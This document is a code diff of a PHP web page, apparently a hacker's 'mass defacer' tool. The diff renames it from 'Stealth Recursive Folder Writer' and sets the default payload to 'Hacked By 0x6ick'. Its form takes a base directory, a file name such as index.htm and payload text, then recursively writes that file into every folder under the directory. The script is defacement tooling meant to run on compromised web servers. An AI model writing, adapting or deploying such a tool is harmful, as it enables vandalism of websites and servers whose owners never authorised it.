@@ -1,5 +1,5 @@
 <?php
-// Stealth Recursive Folder Writer — Fixed by 0x6ick + Nyx6st
+// Mass Defacer — Fixed by 0x6ick + Nyx6st
 /**
             * mass deface toll by 0x6ick ( Copyright 2025 by 6ickwhispers@gmail.com
           **/
@@ -64,7 +64,7 @@ function writeToAllDirs($base, $filename, $payload) {
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $targetDir = $_POST['d'] ?? getcwd();
     $filename = $_POST['f'] ?? 'index.htm';
-    $payload = $_POST['c'] ?? 'Welcome to stealth write';
+    $payload = $_POST['c'] ?? 'Hacked By 0x6ick';
     writeToAllDirs($targetDir, $filename, $payload);
 }
 ?>
@@ -72,7 +72,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 <html lang="en">
 <head>
     <meta charset="UTF-8" />
-    <title>🕶️ Stealth Recursive Writer</title>
+    <title>🕶️ Mass Defacer</title>
     <style>
         body {
             background: linear-gradient(135deg, #0f172a, #020617);
@@ -155,7 +155,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 </head>
 <body>
 <div class="container">
-    <h3>🛠️ Stealth Recursive Folder Writer</h3>
+    <h3>🛠️ Mass Defacer</h3>
     <form method="POST">
         <label>📂 Base Directory:</label>
         <input type="text" name="d" value="<?= htmlspecialchars($_POST['d'] ?? getcwd()) ?>" required>
@@ -164,7 +164,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         <input type="text" name="f" value="<?= htmlspecialchars($_POST['f'] ?? 'index.htm') ?>" required>
 
         <label>🧾 Payload Content:</label>
-        <textarea name="c" required><?= htmlspecialchars($_POST['c'] ?? 'Welcome to stealth write by 0x6ick') ?></textarea>
+        <textarea name="c" required><?= htmlspecialchars($_POST['c'] ?? 'Hacked by 0x6ick') ?></textarea>
 
         <input type="submit" value="🚀 Deploy Recursively">
     </form>
